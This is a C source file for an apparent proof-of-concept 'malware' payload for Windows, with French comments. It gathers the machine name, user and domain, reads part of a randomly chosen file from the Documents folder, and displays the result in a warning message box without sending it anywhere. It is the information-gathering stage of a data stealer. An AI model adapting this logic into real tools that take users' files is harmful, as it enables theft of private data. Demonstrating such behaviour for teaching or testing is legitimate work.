#define _WIN32_IE 0x0500
#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>    // SHGetFolderPathW
#include <wchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>


/*
    x86_64-w64-mingw32-gcc payload.c -o payload.exe -Os -s -lshlwapi -luser32 -lkernel32 -ladvapi32
*/

int main(void) {
    WCHAR compName[MAX_PATH];
    WCHAR userName[128];
    WCHAR domainName[128];
    WCHAR msg[2048];
    WCHAR docPath[MAX_PATH];
    WCHAR searchPath[MAX_PATH];
    WCHAR filePath[MAX_PATH];
    DWORD size = MAX_PATH;
    DWORD userSize = 128, domSize = 128;
    SID_NAME_USE sidType;
    HANDLE hFile;
    DWORD read = 0;
    char filebuf[512] = {0};

    // --- 1. Nom de la machine
    size = MAX_PATH;
    GetComputerNameW(compName, &size);

    // --- 2. User + Domaine
    if (!GetUserNameW(userName, &userSize)) {
        lstrcpyW(userName, L"UnknownUser");
    }
    if (!LookupAccountNameW(NULL, userName, NULL, &size, domainName, &domSize, &sidType)) {
        lstrcpyW(domainName, L"UnknownDomain");
    }

    // --- 3. Cherche un fichier aléatoire dans Documents
    if (SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, docPath) == S_OK) {
        wsprintfW(searchPath, L"%s\\*.*", docPath);

        WIN32_FIND_DATAW ffd;
        HANDLE hFind = FindFirstFileW(searchPath, &ffd);

        if (hFind != INVALID_HANDLE_VALUE) {
            // seed RNG
            srand((unsigned int)time(NULL));

            WCHAR chosen[MAX_PATH] = L"";
            int count = 0;
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    if ((rand() % 5) == 0 || chosen[0] == 0) {
                        wsprintfW(chosen, L"%s\\%s", docPath, ffd.cFileName);
                    }
                    count++;
                }
            } while (FindNextFileW(hFind, &ffd));
            FindClose(hFind);

            if (chosen[0] != 0) {
                lstrcpyW(filePath, chosen);

                // Lire ce fichier
                hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    ReadFile(hFile, filebuf, sizeof(filebuf)-1, &read, NULL);
                    filebuf[read] = 0;
                    CloseHandle(hFile);
                } else {
                    lstrcpyA(filebuf, "Impossible de lire ce fichier");
                }
            } else {
                lstrcpyA(filebuf, "Aucun fichier trouvé");
            }
        } else {
            lstrcpyA(filebuf, "Impossible d’ouvrir Documents");
        }
    } else {
        lstrcpyA(filebuf, "Impossible de localiser Documents");
    }

    wsprintfW(msg, L"💻 Machine : %s\n👤 Utilisateur : %s\\%s\n📄 Fichier aléatoire :\n====================================== %hs\n======================================\n",
              compName, domainName, userName, filebuf);

    // --- Affiche le tout
    MessageBoxW(NULL, msg, L"POC - Malware", MB_ICONWARNING | MB_OK);

    return 0;
}
